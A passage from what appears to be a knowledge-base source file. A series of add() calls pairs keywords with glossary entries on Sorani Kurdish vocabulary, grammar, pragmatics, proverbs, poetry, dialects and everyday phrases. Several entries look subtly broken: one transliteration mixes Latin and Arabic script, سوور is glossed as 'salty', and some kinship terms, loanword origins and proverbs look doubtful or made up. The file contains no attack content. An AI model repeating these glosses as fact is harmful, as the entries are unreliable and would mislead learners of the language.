    'Sorani Kurdish weather vocabulary (کەشوهەوا — kashûhawa): باران (baran — rain), بەفر (bafr — snow), هەور (hawr — cloud), خۆر (xor — sun), تەم (tam — fog), ڕەشەبا (rashabا — storm), بروسکە (bruska — lightning), هەوری تریشقە (hawrî trîshqa — thunder), ساردی (sardî — cold weather), گەرمی (garmî — hot weather), شەپۆل (shapol — wave/breeze), بایەخ (bayax — wind strength), تەماشای (tamashay — observation). Expressions: "هەوا چۆنە؟" (hawa chona? — How is the weather?), "باران دەبارێت" (baran dabbarêt — It is raining), "بەفر دەبارێت" (bafr dabbarêt — It is snowing).', 1.2)

  add('language', ['sorani travel', 'kurdish travel', 'sorani transportation', 'گەشتیاری'],
    'Sorani Kurdish travel vocabulary (گەشتیاری — gashtiarî — travel): فڕۆکە (fṛoka — airplane), ئۆتۆمبێل (otombêl — car), پاس (pas — bus), شەمەندەفەر (shamandafar — train), کەشتی (kashtî — ship), بایسکل (bayskil — bicycle), فڕۆکەخانە (fṛokaxana — airport), وێستگە (wêstga — station), هوتێل (hutêl — hotel), پاسپۆرت (pasport — passport), بلیت (bilît — ticket), گەشتیار (gashtyar — tourist/traveler), ڕێگا (rêga — road/way), شەقام (shaqam — street), پرد (pird — bridge). Phrases: "بۆ کوێ دەچیت؟" (bo kwê dachît? — Where are you going?), "بلیتێکم دەوێت" (bilîtêkim dawêt — I need a ticket).', 1.2)

  add('language', ['sorani health', 'kurdish health', 'sorani medical', 'تەندروستی'],
    'Sorani Kurdish health vocabulary (تەندروستی — tandirustî — health): نەخۆش (naxosh — sick/patient), تەندروست (tandirust — healthy), ئازار (azar — pain), سەردێشە (sardêsha — headache), دڵ ئێش (diḷ êsh — heartache/stomachache), تاو (taw — fever), سەرماخوردن (sarmaxurdin — cold/flu), نەشتەرگەری (nashtargarî — surgery), دەرمان (darman — medicine), نەخۆشخانە (naxoshxana — hospital), پزیشک (pzîshk — doctor), ئێش (êsh — ache/pain). Phrases: "حاڵم باش نییە" (ḥaḷim bash nîya — I don\'t feel well), "ئازارم هەیە" (azarim haya — I have pain), "پزیشکم بۆ ببینم" (pzîshkim bo bbînim — I need to see a doctor).', 1.2)

  add('language', ['sorani technology', 'kurdish technology', 'sorani computer', 'تەکنەلۆژیا'],
    'Sorani Kurdish technology vocabulary (تەکنەلۆژیا — taknolojya): کۆمپیوتەر (kompyûtar — computer), مۆبایل (mobayl — mobile phone), ئینتەرنێت (intarnêt — internet), تەلەفزیۆن (talafzyon — television), لاپتۆپ (laptop — laptop), ئیمەیڵ (îmayḷ — email), وێبسایت (wêbsayt — website), تۆڕی کۆمەڵایەتی (toṛî komalaytî — social media), بەرنامە (barnama — program/app), داتا (data — data), هەکر (hakir — hacker), پاسوۆرد (paswôrd — password), وایفای (wayfay — WiFi). Many tech words are borrowed from English with Kurdish phonology applied. Kurdish digital presence is growing with Kurdish-language websites, apps, and social media.', 1.2)

  add('language', ['sorani sports', 'kurdish sports', 'sorani games', 'وەرزش'],
    'Sorani Kurdish sports vocabulary (وەرزش — warzish): تۆپی پێ (topî pê — football/soccer), باسکەتبۆڵ (baskatboḷ — basketball), وشتنی گوڵە (wishtinî guḷa — wrestling — very popular), هەڵپەڕین (haḷpaṛîn — jumping), ڕاکردن (rakirdin — running), مەلە (mala — swimming), یاری (yarî — game/play), تیم (tîm — team), یاریزان (yarîzan — player), ڕابەر (rabar — coach), بردنەوە (birdnawa — victory/winning), دۆڕاندن (doṛandin — losing), هاوتا (hawta — draw/tie), گۆڵ (goḷ — goal). Wrestling (زوورخانە — zûrxana) is a traditional Kurdish sport with ancient roots.', 1.2)

  add('language', ['sorani music', 'kurdish music', 'sorani instruments', 'مۆسیقا'],
    'Sorani Kurdish music vocabulary (مۆسیقا — mosîqa): گۆرانی (goranî — song), ئاوازە (awaza — melody/tune), دەنگ (dang — voice/sound), تەمبور (tambûr — tanbur — traditional long-necked lute), دەف (daf — frame drum — iconic Kurdish instrument), زورنا (zurna — zurna/oboe), بلوور (bulûr — flute), کەمانچە (kamancha — spike fiddle), گۆرانیبێژ (goranîbêzh — singer), هونەرمەند (hunarmand — artist/musician), ڕیتم (rîtm — rhythm), هەڵپەڕکێ (haḷpaṛkê — folk dance music), دەستە (dasta — ensemble). Kurdish music features emotional vocals, daf rhythms, and pentatonic scales. Famous artists: Nassar Razazi, Adnan Karim, Zakaria Abdulla.', 1.2)

  add('language', ['sorani clothing', 'kurdish clothing', 'sorani traditional dress', 'جل'],
    'Sorani Kurdish clothing vocabulary (جل — jil — clothes): جلوبەرگ (jilûbarg — clothing), کراس (kras — shirt), پانتۆڵ (pantoḷ — pants), پێڵاو (pêḷaw — shoes), کوڵاو (kuḷaw — hat/cap), شاڵ (shaḷ — shawl/waistband), ڕانک (rank — Kurdish traditional wide pants), کەلاو (kalaw — turban — traditional headwear), جلی کوردی (jilî kurdî — Kurdish traditional dress), چاکەت (chakat — jacket), قاپوت (qaput — coat), جلی ژنانە (jilî zhnana — women\'s dress), فیستان (fîstan — dress/gown). Traditional Kurdish dress is colorful and elaborate, with regional variations.', 1.2)

  add('language', ['sorani house', 'kurdish furniture', 'sorani home', 'ماڵ'],
    'Sorani Kurdish home and furniture vocabulary (ماڵ — maḷ — home/house): ژوور (zhûr — room), چێشتخانە (chêshtxana — kitchen), حەمام (ḥamam — bathroom), نووستنگا (nûstinga — bedroom), نیشتمانگا (nîshtimanga — living room), باخچە (bakhcha — garden), دەرگا (darga — door), پەنجەرە (panjara — window), کورسی (kursî — chair), مێز (mêz — table), جێگا (jêga — bed), فەرش (farsh — carpet — important in Kurdish homes), قاپ (qap — dish/plate), قاشوق (qashûq — spoon), چەقۆ (chaqo — knife). Kurdish homes traditionally feature floor seating with colorful carpets.', 1.2)

  add('language', ['sorani shopping', 'kurdish market', 'sorani bazaar', 'بازاڕ'],
    'Sorani Kurdish shopping vocabulary (بازاڕ — bazar — market/bazaar): بازاڕ (bazar — market), دوکان (dûkan — shop), کڕین (kṛîn — to buy), فرۆشتن (froshtin — to sell), نرخ (nirx — price), گران (gran — expensive), هەرزان (harzan — cheap), پارە (para — money), دینار (dînar — dinar — Iraqi currency), فرۆشیار (froshyar — seller), کڕیار (kṛyar — buyer), میزان (mîzan — scale/balance). Phrases: "چەندە؟" (chanda? — How much?), "زۆر گرانە" (zor grana — It\'s very expensive), "کەمی لێ بکە" (kamî lê bka — Give a discount), "دەمەوێت بکڕم" (damawêt bikṛim — I want to buy).', 1.2)

  add('language', ['sorani directions', 'kurdish directions', 'sorani navigation', 'ئاڕاستە'],
    'Sorani Kurdish directions vocabulary (ئاڕاستە — aṛasta — direction): ڕاست (rast — right), چەپ (chap — left), ڕاستەوخۆ (rastawxo — straight ahead), باکوور (bakûr — north), باشوور (bashûr — south), ڕۆژهەڵات (rozhhaḷat — east), ڕۆژئاوا (rozhawa — west), لای (lay — beside/near), دوور (dûr — far), نزیک (nizîk — near/close), نێوان (nêwan — between), هەموو (hamû — all/every). Phrases: "ببوورە، ڕێگا بۆ...?" (bibûra, rêga bo...? — Excuse me, the way to...?), "ڕاست بکە" (rast bka — Turn right), "چەپ بکە" (chap bka — Turn left), "ڕاستەوخۆ بچۆ" (rastawxo bcho — Go straight).', 1.2)

  add('language', ['sorani city', 'kurdish city', 'sorani urban', 'شار'],
    'Sorani Kurdish city/urban vocabulary (شار — shar — city): شار (shar — city), گوند (gund — village), شەقام (shaqam — street), مەیدان (maydan — square/plaza), بازاڕ (bazar — market), مزگەوت (mizgawt — mosque), کەنیسە (kanîsa — church), قوتابخانە (qutabxana — school), نەخۆشخانە (naxoshxana — hospital), پۆستخانە (postxana — post office), بانک (bank — bank), ڕێستۆران (rêstoran — restaurant), چایخانە (chayxana — tea house), پارک (park — park), پرد (pird — bridge), کۆڵان (koḷan — alley), دەروازە (darwaza — gate/entrance). Kurdish cities blend modern and traditional architecture.', 1.2)

  add('language', ['sorani religion', 'kurdish religion', 'sorani faith', 'ئایین'],
    'Sorani Kurdish religion vocabulary (ئایین — ayîn — religion): خوا (xwa — God), نوێژ (nwêzh — prayer), مزگەوت (mizgawt — mosque), قورئان (quran — Quran), ئیسلام (îslam — Islam), مەسیحی (masîḥî — Christian), ئێزیدی (êzîdî — Yezidi — significant Kurdish minority religion), زەردەشتی (zardashtî — Zoroastrian), ڕۆژوو (rozhû — fasting), عید (ʿîd — Eid/holiday), نەورۆز (nawroz — Newroz — Kurdish New Year, March 21), حەج (ḥaj — Hajj), حەرام (ḥaram — forbidden), حەلاڵ (ḥalaḷ — permitted). Kurds are religiously diverse: majority Muslim (Sunni), plus Yezidis, Christians, Yarsan, Zoroastrians.', 1.2)

  // ── Kurdish Sorani — Deep Semantics & Linguistic Analysis ──────────────

  add('language', ['sorani morphology', 'kurdish morphology', 'sorani word structure', 'مۆرفۆلۆژی'],
    'Sorani Kurdish morphology (مۆرفۆلۆژی): Kurdish is moderately synthetic with rich agglutinative features. ROOT + PREFIX + SUFFIX structure. Verb morphology: PERSON prefixes (دە-/نا-/بـ-) + STEM + person suffixes (-م/-یت/-ات/-ین/-ن). Noun morphology: ROOT + DEFINITENESS (-ەکە/-ێک) + PLURAL (-ان/-ەکان) + CASE (oblique ی). Derivational morphology: -کار (-kar — doer: کار→کارکەر worker), -خانە (-xana — place: نان→نانەواخانە bakery), -ی (-î — abstract: ئازاد→ئازادی freedom), -انە (-ana — manner: ڕۆژ→ڕۆژانە daily). Morpheme order is fixed and predictable.', 1.4)

  add('language', ['sorani derivation', 'kurdish word derivation', 'sorani prefix suffix', 'دروستکردنی وشە'],
    'Sorani Kurdish word derivation (دروستکردنی وشە): PREFIXES: هەڵ- (haḷ- — up/away: هەڵگرتن — to pick up), دا- (da- — down: داگرتن — to download/close), ڕا- (ṛa- — away/forth: ڕاکردن — to run), تێ- (tê- — through: تێگەیشتن — to understand), هاو- (haw- — co/together: هاوکار — colleague). SUFFIXES: -دار (-dar — having: ئاودار — watery), -مەند (-mand — possessing: هونەرمەند — artistic/artist), -گەر (-gar — doer: کارگەر — worker), -ستان (-stan — land of: کوردستان — Kurdistan), -گا (-ga — place: خوێندنگا — school). Derivation is highly productive in Kurdish.', 1.3)

  add('language', ['sorani loanwords', 'kurdish borrowing', 'sorani foreign words', 'وشەی دەرەکی'],
    'Sorani Kurdish loanwords (وشەی دەرەکی — wushay darakî): ARABIC loans (largest source, religion/education/admin): کتێب (ktêb — book), مامۆستا (mamosta — teacher), حکومەت (ḥikumat — government), عەقڵ (ʿaqḷ — mind/reason). PERSIAN loans (culture/admin): باخچە (bakhcha — garden), فەرمان (farman — order/decree), شار (shar — city). TURKISH loans (military/food): ئۆردوو (ordû — army/camp), کەباب (kabab — kebab). ENGLISH loans (modern technology): کۆمپیوتەر (kompyûtar), ئینتەرنێت (intarnêt), مۆبایل (mobayl). Kurdish adapts loans to its phonology: "television" → تەلەفزیۆن, "hospital" → حەسپاخانە (from Arabic) or نەخۆشخانە (native).', 1.3)

  add('language', ['sorani pragmatics', 'kurdish pragmatics', 'sorani speech acts', 'پراگماتیک'],
    'Sorani Kurdish pragmatics (پراگماتیک): SPEECH ACTS: Requests use بـ- subjunctive softener: "بتوانیت یارمەتیم بدەیت؟" (bitwanît yarmatîm bdayt? — Could you help me?). INDIRECTNESS: Kurds prefer indirect requests — "ئاو نییە" (aw nîya — There is no water) implies "please bring water." HOSPITALITY scripts: Guest must refuse tea initially, host must insist 3 times. TURN-TAKING: Elders speak first. Topic shifts signaled by "باشە" (basha — okay/well). FACE-SAVING: Criticism softened with "ببوورە بەڵام..." (bibûra baḷam... — sorry but...). Compliments deflected: "قوربانت" (qurbant — your sacrifice/you\'re too kind).', 1.4)

  add('language', ['sorani discourse markers', 'kurdish discourse', 'sorani connectors', 'گرێدەر'],
    'Sorani Kurdish discourse markers (گرێدەر — grêdar): TOPIC SHIFT: باشە (basha — okay/well/anyway), خۆ (xo — well/so), دەی (day — so/then). ELABORATION: واتە (wata — that is/meaning), مەبەستم (mabastim — I mean). CONTRAST: بەڵام (baḷam — but/however), لەبری ئەوە (labrî awa — instead). CONSEQUENCE: بۆیە (boya — therefore), لەبەر ئەوە (labar awa — because of that). SEQUENCE: یەکەم (yakam — first), دواتر (dwatir — then/later), لە کۆتاییدا (la kotayîda — finally). HEDGING: بەلکو (balku — perhaps), لەوانەیە (lawanaya — maybe), بە ڕای من (ba ṛay min — in my opinion). EMPHASIS: ئەڵبەتتە (aḷbatta — of course), بەتایبەتی (bataybatî — especially).', 1.3)

  add('language', ['sorani evidentiality', 'kurdish evidentiality', 'sorani reported speech', 'بەڵگەداری'],
    'Sorani Kurdish evidentiality (بەڵگەداری — baḷgadarî): Kurdish distinguishes witnessed vs reported information. DIRECT EVIDENCE (witnessed): simple past: "ئەو هات" (aw hat — He/she came [I saw it]). REPORTED/HEARSAY: evidential particle "دەکا" or "وا دەڵێن" (wa daḷên — they say): "وا دەڵێن هاتووە" (wa daḷên hatûa — They say he has come). INFERENCE: "وا دیارە" (wa diyara — it appears that): "وا دیارە نەخۆشە" (wa diyara naxosha — It seems he\'s sick). MIRATIVE (surprise): "چ!" (ch! — what!): "ئەو هاتووە؟!" (aw hatûa?! — He came?! [surprised]). This system reflects Kurdish attention to information source and reliability.', 1.4)

  add('language', ['sorani proverbs', 'kurdish proverbs', 'sorani wisdom', 'پەند'],
    'Sorani Kurdish proverbs (پەند — pand — proverb/wisdom): "کەسێک بێ کتێب، وەک دارێک بێ بەرگ" (kasêk bê ktêb, wak darêk bê barg — A person without a book is like a tree without leaves). "زمان شمشێرە، وشە تیرە" (zman shimshêra, wusha tîra — Language is a sword, words are arrows). "دیوارەکان گوێیان هەیە" (dîwarakan gwêyan haya — Walls have ears). "دەست بە دەست بشۆ، دەست بە ڕوو بشۆ" (dast ba dast bsho, dast ba ṛû bsho — Wash hand with hand, hand washes face — i.e., cooperation). "چاوی ناشتە خەو نابینێت" (chawî nashta xaw nabînêt — The hungry eye sees no sleep). Proverbs are central to Kurdish oral tradition.', 1.3)

  add('language', ['sorani poetry', 'kurdish poetry', 'sorani verse', 'شیعر'],
    'Sorani Kurdish poetry (شیعر — shiʿir): Kurdish has a rich poetic tradition spanning centuries. Classical forms: قەسیدە (qasîda — ode), غەزەل (ghazal — lyric poem), ڕوبای (rûbay — quatrain). Modern free verse: شیعری ئازاد (shiʿrî azad). Key poets: ئەحمەدی خانی (Ahmad Khani, 1650-1707 — "مەم و زین"), نالی (Nali, 1797-1855 — romantic), حاجی قادری کۆیی (Haji Qadir Koyi, 1817-1897 — nationalist), عەبدوللا گۆران (Abdullah Goran, 1904-1962 — father of modern Kurdish poetry), شێرکۆ بێکەس (Sherko Bekas, 1940-2013 — contemporary master). Poetry themes: love (ئەوین), nature (سروشت), homeland (نیشتمان), freedom (ئازادی).', 1.3)

  add('language', ['sorani metaphor', 'kurdish metaphor', 'sorani figurative', 'واتای مەجازی'],
    'Sorani Kurdish metaphorical language (واتای مەجازی — watay majazî): HEART metaphors (دڵ — diḷ): دڵ بە دوای (diḷ ba dway — heart follows = desires), دڵ بڕین (diḷ biṛîn — heart cutting = heartbreak), دڵ دایین (diḷ dayîn — heart giving = falling in love), دڵ نەرم بوون (diḷ narm bûn — heart softening = becoming compassionate). HEAD metaphors (سەر — sar): سەری هەیە (sarî haya — has a head = is clever), بێ سەروبەری (bê sarûbarî — without head and direction = chaotic). NATURE metaphors: "وەک چیا نەلەرزێ" (wak chya nalarzê — unshakeable like a mountain), "وەک ڕووبار تێپەڕ" (wak rûbar têpaṛ — passes like a river = time). Metaphors reveal Kurdish cultural values.', 1.4)

  add('language', ['sorani synonyms antonyms', 'kurdish synonym', 'sorani word relations', 'هاوواتا و دژواتا'],
    'Sorani Kurdish synonyms and antonyms (هاوواتا و دژواتا): SYNONYMS (هاوواتا — hawwata): گەورە/مەزن (gawra/mazin — big), چوون/ڕۆیشتن (chûn/royshtin — to go), جوان/خۆشەویست (jwan/xoshawîst — beautiful), زمان/زاراوە (zman/zarawa — language/dialect). ANTONYMS (دژواتا — dizhwata): گەورە↔بچووک (gawra↔bchûk — big↔small), باش↔خراپ (bash↔xrap — good↔bad), گەرم↔سارد (garm↔sard — hot↔cold), زوو↔درەنگ (zû↔drang — early↔late), نزیک↔دوور (nizîk↔dûr — near↔far), کڕین↔فرۆشتن (kṛîn↔froshtin — buy↔sell), ڕاست↔چەپ (rast↔chap — right↔left). Understanding these pairs deepens vocabulary and semantic awareness.', 1.3)

  add('language', ['sorani semantic fields', 'kurdish semantic domains', 'sorani lexical fields', 'بواری واتایی'],
    'Sorani Kurdish semantic field analysis (بواری واتایی — buwarî watayî): MOUNTAIN DOMAIN: چیا (chya — mountain), شاخ (shakh — mountain range), دۆڵ (doḷ — valley), گەل (gal — ravine), بەرز (barz — high/tall), نزم (nizm — low), شەقام (shaqam — cliff path). WATER DOMAIN: ئاو (aw — water), ڕووبار (rûbar — river), چەم (cham — stream), کانی (kanî — spring), دەریا (darya — lake/sea), سەرچاوە (sarchawa — source/spring). KINSHIP TERMS differentiate paternal vs maternal: مام vs خاڵ (uncle), پور vs خاڵۆ (aunt). These semantic fields reflect Kurdish geography, culture, and social organization.', 1.3)

  add('language', ['sorani onomatopoeia', 'kurdish sound words', 'sorani imitative words', 'وشەی دەنگلێنانەوە'],
    'Sorani Kurdish onomatopoeia (وشەی دەنگلێنانەوە): تق تق (taq taq — knocking), شر شر (shir shir — flowing water), ڤز ڤز (viz viz — buzzing), قرچ قرچ (qirch qirch — crunching), پف پف (pif pif — puffing), ناڵین (naḷîn — moaning/groaning), زنگ زنگ (zing zing — ringing), گر گر (gir gir — growling/rumbling), شەق شەق (shaq shaq — cracking), تەق تەق (taq taq — shooting/popping). Kurdish uses sound symbolism productively: reduplication intensifies: "باران شر شر دەبارێت" (baran shir shir dabbarêt — rain pours down [with sound]). Sound words appear frequently in poetry and storytelling.', 1.2)

  add('language', ['sorani honorific system', 'kurdish social register', 'sorani formal informal', 'ئاستی زمان'],
    'Sorani Kurdish register and social language (ئاستی زمان — astî zman): FORMAL register: لەگەڵ ڕێزدا (lagaḷ rêzda — with respect), uses ئێوە (êwa — formal you), titles (بەرێز — barêz, خان — xan), complete verb forms. INFORMAL register: تۆ (to — informal you), shortened forms, slang, particle dropping. LITERARY/WRITTEN: complex sentences, Arabic/Persian loanwords, classical vocabulary. SPOKEN COLLOQUIAL: simplified grammar, English loanwords, regional variations. CODE-SWITCHING: Many speakers mix Kurdish with Arabic or English in daily speech. Register choice depends on: age of interlocutor, social setting, topic, relationship closeness. Elders always receive formal register.', 1.3)

  add('language', ['sorani reduplication', 'kurdish reduplication', 'sorani repeated words', 'دووبارەکردنەوە'],
    'Sorani Kurdish reduplication (دووبارەکردنەوە — dûbarakirdinawa): FULL REDUPLICATION: intensity/distribution — "هێواش هێواش" (hêwash hêwash — very slowly), "یەک یەک" (yak yak — one by one), "ڕۆژ ڕۆژ" (rozh rozh — day by day). PARTIAL REDUPLICATION: m-echo — creates "and similar things": چا مای (cha may — tea and such), نان مان (nan man — bread and such). ONOMATOPOEIC REDUPLICATION: "تق تق" (taq taq), "شر شر" (shir shir). VERBAL REDUPLICATION: repeated action: "چوو و هات" (chû û hat — went and came = paced back and forth). Reduplication is a productive morphological process expressing plurality, intensity, continuity, and approximation.', 1.3)

  add('language', ['sorani numeral classifier', 'kurdish counting system', 'sorani numbers advanced', 'ژمارەی پێشکەوتوو'],
    'Sorani Kurdish advanced number system: FRACTIONS: نیو (nîw — half), سێ یەکی (sê yakî — one third), چوارەکی (chwarakî — quarter). DECIMALS: خاڵ (xaḷ — point): "سێ خاڵ پێنج" (sê xaḷ pênj — 3.5). CLASSIFIERS: Kurdish uses measure words: دانە (dana — unit/piece), جووت (jût — pair), سەر (sar — head, for animals), گەلا (gala — bunch). ORDINALS: suffix -ەم (-am): یەکەم (yakam — first), دووەم (dûam — second). MULTIPLICATIVES: "جار" (jar — time): یەک جار (yak jar — once), دوو جار (dû jar — twice). DISTRIBUTIVE: هەر (har — each): هەر کەسێک (har kasêk — each person). Large numbers: ملیۆن (milyon — million), ملیار (milyar — billion).', 1.2)

  add('language', ['sorani verb particles', 'kurdish phrasal verbs', 'sorani compound verbs', 'کرداری لێکدراو'],
    'Sorani Kurdish verb particles and compound verbs (کرداری لێکدراو): DIRECTIONAL PARTICLES: هەڵ- (haḷ- — up): هەڵسان (haḷsan — to stand up), هەڵگرتن (haḷgirtin — to pick up). دا- (da- — down): دانیشتن (danîshtin — to sit down), داخستن (daxistin — to close). ڕا- (ṛa- — along/away): ڕاکردن (ṛakirdin — to run), ڕاگرتن (ṛagirtin — to stop). تێ- (tê- — into/through): تێگەیشتن (têgayshtin — to understand), تێکەڵ (têkaḷ — mixed). LIGHT VERB COMPOUNDS: noun + کردن (kirdin — to do): کار کردن (kar kirdin — to work), قسە کردن (qsa kirdin — to speak), یارمەتی دان (yarmatî dan — to help).', 1.3)

  add('language', ['sorani spatial terms', 'kurdish spatial language', 'sorani location words', 'شوێن'],
    'Sorani Kurdish spatial language: DEICTIC terms: ئێرە (êra — here), ئەوێ (awê — there), ئەم لاوە (am lawa — this side), ئەو لاوە (aw lawa — that side). INTRINSIC terms: ناو (naw — inside), دەرەوە (darawa — outside), سەر (sar — top/on), ژێر (zhêr — under/below), پشت (pisht — behind/back), بەردەم (bardam — front). RELATIVE terms: ڕاست (rast — right), چەپ (chap — left). SPATIAL POSTPOSITIONS: لەسەر (lasar — on), لەژێر (lazhêr — under), لەنێو (lanêw — among/in), لەپاڵ (lapaḷ — beside), لەدوای (ladway — behind). Kurdish spatial language uses body-part terms metaphorically: "سەر" (head) = top, "پێ" (foot) = bottom.', 1.3)

  add('language', ['sorani kinship', 'kurdish family system', 'sorani extended family', 'خزم و کەس'],
    'Sorani Kurdish kinship system (خزم و کەس — xizm û kas): Kurdish has elaborate kinship terms reflecting tribal social structure. PATERNAL vs MATERNAL distinction: مام (mam — paternal uncle) vs خاڵ (xaḷ — maternal uncle), پور (pûr — paternal aunt) vs خاڵۆ (xaḷo — maternal aunt). IN-LAWS: خەسوو (xasû — mother-in-law), خەزوور (xazûr — father-in-law), هێور (hêwir — brother-in-law), ژنبرا (zhinbra — sister-in-law). TRIBAL terms: هۆز (hoz — tribe/clan), تایفە (tayfa — extended family group), ئاخا (axa — tribal chief). GENERATIONAL: باپیر (bapîr — grandfather), باوباپیر (bawbapîr — great-grandfather). Kurdish kinship terms are more specific than English.', 1.3)

  add('language', ['sorani politeness strategies', 'kurdish face', 'sorani social norms', 'نۆرمی کۆمەڵایەتی'],
    'Sorani Kurdish advanced politeness strategies: POSITIVE POLITENESS: compliments (وا جوانە! — wa jwana! — How beautiful!), inclusion ("بیا ئێمەش بچین" — bya êmash bchîn — Let us also go), shared identity markers. NEGATIVE POLITENESS: indirectness, hedging ("ئەگەر بتوانیت..." — agar bitwanît... — if you could...), minimizing imposition. FACE-THREATENING acts mitigated by: pre-sequences ("شتێکت پێ بڵێم..." — shtêkt pê bḷêm... — let me tell you something...), apologies before requests ("ببوورە..." — bibûra...). HOSPITALITY rituals: offer→refuse→insist→accept (3-round protocol). LEAVE-TAKING requires multiple exchanges: "بڕۆ بە سەلامەت" → "خوات لەگەڵ" → "خوات پارێزێت".', 1.3)

  add('language', ['sorani dialects detailed', 'kurdish regional varieties', 'sorani vs sulaymaniyah', 'زاراوەکان'],
    'Sorani Kurdish dialectal variation (زاراوەکان — zarawakan): SULAYMANIYAH dialect: considered standard literary Sorani, "من" (min — I), open vowels, more Persian/Arabic loans. ERBIL/HAWLER dialect: "من" pronounced as "mn", shorter vowels, some Kurmanji influence, "ئەو" → "ئا" contraction. KIRKUK dialect: Arabic influence, some unique vocabulary. SANANDAJ (Iran) dialect: Persian influence, some archaic features preserved. Key differences: pronunciation of ڕ (rr) varies by region, vocabulary for common items differs (e.g., "tomato" = تەماتە/فرەنگی), intonation patterns vary. All dialects are mutually intelligible but show clear phonological and lexical differences.', 1.2)

  add('language', ['sorani writing history', 'kurdish script evolution', 'sorani orthography', 'ئۆرتۆگرافی'],
    'Sorani Kurdish orthography and script history: 1) Pre-20th century: oral tradition, some manuscripts in Arabic script. 2) 1920s: Taufiq Wahby standardized modified Arabic script for Sorani. 3) Key adaptations: Added ڤ (v), ڕ (rr), ڵ (ḷḷ), پ (p), چ (ch), ژ (zh), گ (g) — sounds absent in Arabic. 4) All vowels written explicitly (unlike Arabic) — makes Kurdish more phonetically transparent. 5) Latin-based "Hawar alphabet" used for Kurmanji (developed by Celadet Bedirxan, 1930s). 6) Debate continues: some advocate unified Latin script for all Kurdish dialects. 7) Current challenges: Unicode support, digital keyboard layouts, standardization across regions. Kurdish Wikipedia uses Sorani Arabic script.', 1.2)

  // ── Kurdish Sorani — Conversation & Daily Dialogue ──────────────────────

  add('language', ['sorani conversation phrases', 'kurdish daily dialogue', 'sorani speaking practice', 'وتووێژی ڕۆژانە'],
    'Sorani Kurdish conversation and daily dialogue patterns: GREETINGS: ڕۆژ باش (rozh bash — good day), ئێوارە باش (êwara bash — good evening), شەو باش (shaw bash — good night). INTRODUCTIONS: ناوت چییە؟ (nawit chîya? — What is your name?), ناوم ... ە (nawim ...a — My name is...), خۆشحاڵم بە ناسینت (xoshḥaḷim ba nasînit — Nice to meet you). ASKING ABOUT WELLBEING: چۆنی؟ (chonî? — How are you?), باشم سوپاس (bashim supas — I am well, thanks), تۆ چۆنی؟ (to chonî? — And you?). FAREWELLS: خوات لەگەڵ (xwat lagaḷ — Goodbye, lit. God with you), بڕۆ بە سەلامەت (biṛo ba salamat — Go safely). SMALL TALK: ئەمڕۆ هەوا چۆنە؟ (amṛo hawa chona? — How is the weather today?), لەکوێ دەژیت؟ (la kwê dazhît? — Where do you live?).', 1.3)

  add('language', ['sorani shopping dialogue', 'kurdish bazaar phrases', 'sorani market language', 'زمانی بازاڕ'],
    'Sorani Kurdish shopping and bazaar dialogue: ASKING PRICE: ئەمە بە چەندە؟ (ama ba chanda? — How much is this?), نرخەکەی چەندە؟ (nirxakay chanda? — What is the price?). BARGAINING: زۆر گرانە! (zor grana! — Too expensive!), داشکانت بکە (dashkanit bka — Give me a discount), ئایا کەمتر ناکەیت؟ (aya kamtir nakayit? — Can you lower it?). BUYING: ئەمەم دەوێت (amam dawêt — I want this), دوو کیلۆ بدە (dû kîlo bda — Give me two kilos). PAYMENT: پارە (para — money), پشوو (pishû — change), پسوولە (pisûla — receipt). QUALITY: تازەیە؟ (tazaya? — Is it fresh?), جوانە (jwana — It is beautiful), باشە (basha — It is good).', 1.3)

  add('language', ['sorani restaurant phrases', 'kurdish food ordering', 'sorani dining language', 'زمانی چێشتخانە'],
    'Sorani Kurdish restaurant and dining language: ORDERING: لیستی خواردن (lîstî xwardin — menu), ئەم خواردنەم دەوێت (am xwardanam dawêt — I want this dish), ئاو بدە تکایە (aw bda tikaya — Water please). PREFERENCES: بەبێ گۆشت (babê gosht — without meat), تیژ (tîzh — spicy), شیرین (shîrîn — sweet), سوور (sûr — salty). COMPLIMENTS: زۆر بەتام بوو (zor batam bû — Very tasty), دەستت خۆش بێت (dastt xosh bêt — Bless your hands, to the cook). TRADITIONAL DISHES: دۆلمە (dolma), کوببە (kubba), بریانی (biryani), تەشریب (tashîrb), کەباب (kabab). DRINKS: چا (cha — tea), قاوە (qawa — coffee), دۆ (do — yogurt drink), شەربەت (sharbat — sherbet).', 1.3)

  // ── Kurdish Sorani — Technology & Modern Vocabulary ─────────────────────

  add('language', ['sorani technology words', 'kurdish tech vocabulary', 'sorani digital terms', 'وشەی تەکنەلۆژیا'],
    'Sorani Kurdish technology and digital vocabulary: COMPUTING: کۆمپیوتەر (kompyûtar — computer), لاپتۆپ (laptôp — laptop), تەختەکلیل (taxtaklîl — keyboard), ماوس (maws — mouse), هارددیسک (hârdisk — hard disk), سکرین (skrîn — screen). INTERNET: ئینتەرنێت (întarnêt — internet), وێبسایت (wêbsayt — website), ئیمەیل (îmayil — email), سۆشیال میدیا (soshyal mîdya — social media), داونلۆد (dawnlod — download), ئەپلۆد (aplod — upload). PHONE: مۆبایل (mobayl — mobile), پەیام (payam — message), بانگ (bang — call), وێنە (wêna — photo), ڤیدیۆ (vîdyo — video). SOFTWARE: بەرنامە (barnama — program/app), نەرمەکاڵا (narmakâla — software), ڕەقەکاڵا (raqakâla — hardware).', 1.3)

  add('language', ['sorani social media terms', 'kurdish internet slang', 'sorani online communication', 'ئاڵوگۆڕی ئۆنلاین'],
    'Sorani Kurdish social media and online communication: PLATFORMS: فەیسبووک (faysbûk — Facebook), ئینستاگرام (înstagrâm — Instagram), تویتەر (twîtar — Twitter/X), یوتیوب (yûtûb — YouTube), تیکتۆک (tîktok — TikTok). ACTIONS: لایک (layk — like), شەیر (shayr — share), کۆمێنت (komênt — comment), فۆلۆو (folo — follow), بڵاوکردنەوە (biḷawkirdanawa — repost). CONTENT: پۆست (post — post), ستۆری (storî — story), ڕیلز (rîlz — reels), لایڤ (layv — live stream), هاشتاگ (hâshtâg — hashtag). MODERN KURDISH NEOLOGISMS: تۆڕی کۆمەڵایەتی (toṛî komalaytî — social network), بڵاوکەرەوە (biḷawkarawya — influencer).', 1.2)

  // ── Kurdish Sorani — Science & Academic Vocabulary ──────────────────────

  add('language', ['sorani science vocabulary', 'kurdish scientific terms', 'sorani academic words', 'وشەی زانستی'],
